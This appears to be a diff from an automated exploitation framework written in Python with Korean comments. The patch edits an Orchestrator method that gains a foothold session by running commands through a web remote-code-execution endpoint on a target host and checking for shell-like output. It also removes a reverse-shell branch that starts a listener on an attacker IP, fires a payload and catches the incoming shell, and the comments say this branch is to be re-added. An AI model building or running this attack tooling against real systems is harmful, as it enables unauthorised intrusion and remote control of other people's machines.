@@ -1433,11 +1433,13 @@ class Orchestrator:
             self.world.add_flag(kind, val)
 
     def _acquire_session(self, report, host):
+        """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
+        현재는 웹 RCE 분기만 활성 — 역쉘 수신 경로는 순서 4(실제 경로 확인) 후 재추가."""
         from .session_verify import looks_like_shell, verify_probe_command
         from .shell_session import WebRceSession
-        from .shell_transport import catch_reverse_shell, web_http_fn
+        from .shell_transport import web_http_fn
 
-        # (1) 웹 RCE 분기 (기존, 순서 2)
+        # (1) 웹 RCE 분기: cmd 엔드포인트에 명령 실행 → id/uname 신호로 성립 검증
         if self.world.web_product and self.auto_poc:
             # PoC 가 성립시킨 cmd 엔드포인트(없으면 기본 config.php) — ②에서 정교화
             url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
@@ -1446,29 +1448,6 @@ class Orchestrator:
             # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
             if looks_like_shell(ws.run(verify_probe_command())):
                 return ws
-            return None
-        return None
-
-        # (2) 역쉘 분기: 리스너를 백그라운드로 먼저 띄우고 → 페이로드 발사 → accept 대기
-        attacker = list(self.guard.attacker_ips or [])
-        if self.auto_poc and attacker and getattr(self, "revshell_payload_cmd", None):
-            import threading
-            lhost = str(attacker[0]); lport = self.revshell_port
-            holder = {}
-            def _listen():
-                try:
-                    holder["sess"] = catch_reverse_shell(lhost, lport, timeout=60.0)
-                except Exception as e:
-                    holder["err"] = e
-            t = threading.Thread(target=_listen, daemon=True); t.start()
-            import time; time.sleep(1.0)                 # 리스너 bind 대기
-            # ★ 페이로드 발사(RCE 로 역쉘 트리거) — self.revshell_payload_cmd 는 ②가 세팅
-            self._safe_run(self.revshell_payload_cmd)    # 또는 WebRceSession.run 으로 발사
-            t.join(timeout=65.0)
-            sess = holder.get("sess")
-            if sess and looks_like_shell(sess.run(verify_probe_command())):
-                return sess
-            return None
         return None
 
     def _prepare_revshells(self, report: OrchestrationReport) -> None:
